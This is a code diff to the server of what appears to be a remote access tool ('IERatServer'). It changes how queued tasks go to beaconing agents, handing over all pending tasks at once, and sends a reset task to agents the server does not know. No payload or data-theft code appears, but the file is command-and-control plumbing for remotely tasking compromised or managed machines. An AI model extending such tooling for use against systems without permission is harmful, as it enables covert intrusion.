@@ -4,6 +4,7 @@ using WatsonWebserver;
 using IERatServer.lib;
 using Newtonsoft.Json;
 using System.Drawing;
+using System.Collections.Generic;
 
 namespace IERatServer
 {
@@ -80,8 +81,8 @@ namespace IERatServer
 
                 ResponseObject responseObject = new()
                 {
-                    Type = "NewTask",
-                    Task = GetTaskFromAgent(requestObject.AgentID),
+                    Type = "NewTasks",
+                    Tasks = GetTasksForAgent(requestObject.AgentID),
                     Notes = "",
                 };
                 var responseString = JsonConvert.SerializeObject(responseObject);
@@ -105,7 +106,6 @@ namespace IERatServer
                 ResponseObject responseObject = new()
                 {
                     Type = "NewAgent",
-                    Task = null,
                     Notes = "Ok",
                 };
                 if (!Db.AgentExists(beacon.ID))
@@ -128,25 +128,30 @@ namespace IERatServer
         {
             await ctx.Response.Send("Hello World");
         }
-        public static TaskObject GetTaskFromAgent(Guid ID)
+        public static List<TaskObject> GetTasksForAgent(Guid ID)
         {
             AgentChannel Channel = Db.channels.Find(Channel => Channel.agent.ID == ID);
+            List<TaskObject> Tasks = new() { };
+
             if (Channel != null)
             {
-                if (Channel.agent.AgentTasks.Count != 0) {
-                    var TaskToRun = Channel.agent.AgentTasks.Dequeue();
-                    TaskToRun.Status = "In Progress";
-                    return TaskToRun;
-                }
-                else
+                if (Channel.agent.AgentTasks.Count != 0)
                 {
-                    return null;
+                    while (Channel.agent.AgentTasks.Count > 0)
+                    {
+                        var TaskToRun = Channel.agent.AgentTasks.Dequeue();
+                        TaskToRun.Status = "In Progress";
+                        Tasks.Add(TaskToRun);
+                    }
                 }
+                return Tasks;
             }
-            else {
-                TaskObject ResetConnectionTask = new TaskObject { Type = "Reset" };
-                return ResetConnectionTask;
-            }            
+            else
+            {
+                TaskObject ResetConnectionTask = new() { Type = "Reset" };
+                Tasks.Add(ResetConnectionTask);
+            }
+            return Tasks;
         }
     }
 }
